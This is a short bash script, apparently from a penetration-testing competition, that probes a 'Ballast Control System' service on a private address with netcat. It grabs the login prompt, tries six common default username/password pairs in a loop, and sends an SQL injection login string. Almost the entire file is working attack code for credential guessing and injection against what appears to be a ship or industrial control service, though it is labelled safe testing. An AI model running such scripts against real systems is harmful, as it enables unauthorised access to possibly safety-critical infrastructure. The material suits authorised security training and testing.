#!/bin/bash
# Safe testing script for Ballast Control System
# Target: 10.0.1.10:9000

TARGET="10.0.1.10"
PORT="9000"
OUTPUT_DIR="/home/pentester/cptc/custom-protocols"

echo "[+] Testing Ballast Control System"
echo "[+] Target: $TARGET:$PORT"
echo ""

# Test 1: Basic connection
echo "[TEST 1] Connecting and retrieving authentication prompt..."
echo "" | nc -w 3 $TARGET $PORT > "$OUTPUT_DIR/ballast-control-prompt.txt" 2>&1
cat "$OUTPUT_DIR/ballast-control-prompt.txt"
echo ""

# Test 2: Test LOGIN syntax
echo "[TEST 2] Testing LOGIN command syntax..."
echo "LOGIN" | nc -w 3 $TARGET $PORT > "$OUTPUT_DIR/ballast-login-syntax.txt" 2>&1
cat "$OUTPUT_DIR/ballast-login-syntax.txt"
echo ""

# Test 3: Test common default credentials
echo "[TEST 3] Testing common default credentials..."
for combo in "admin admin" "admin password" "root root" "admin 123456" "operator operator" "ballast ballast"; do
    user=$(echo $combo | awk '{print $1}')
    pass=$(echo $combo | awk '{print $2}')
    echo "  Trying: $user / $pass"
    echo "LOGIN $user $pass" | nc -w 3 $TARGET $PORT > "$OUTPUT_DIR/ballast-login-$user-$pass.txt" 2>&1
    tail -n 5 "$OUTPUT_DIR/ballast-login-$user-$pass.txt"
done
echo ""

# Test 4: Test HELP command
echo "[TEST 4] Testing HELP command..."
echo "HELP" | nc -w 3 $TARGET $PORT > "$OUTPUT_DIR/ballast-help.txt" 2>&1
tail -n 10 "$OUTPUT_DIR/ballast-help.txt"
echo ""

# Test 5: SQL injection attempts (safe)
echo "[TEST 5] Testing SQL injection patterns..."
echo "LOGIN admin' OR '1'='1 password" | nc -w 3 $TARGET $PORT > "$OUTPUT_DIR/ballast-sqli-test.txt" 2>&1
tail -n 5 "$OUTPUT_DIR/ballast-sqli-test.txt"
echo ""

echo "[+] Ballast Control testing completed. Results in $OUTPUT_DIR"
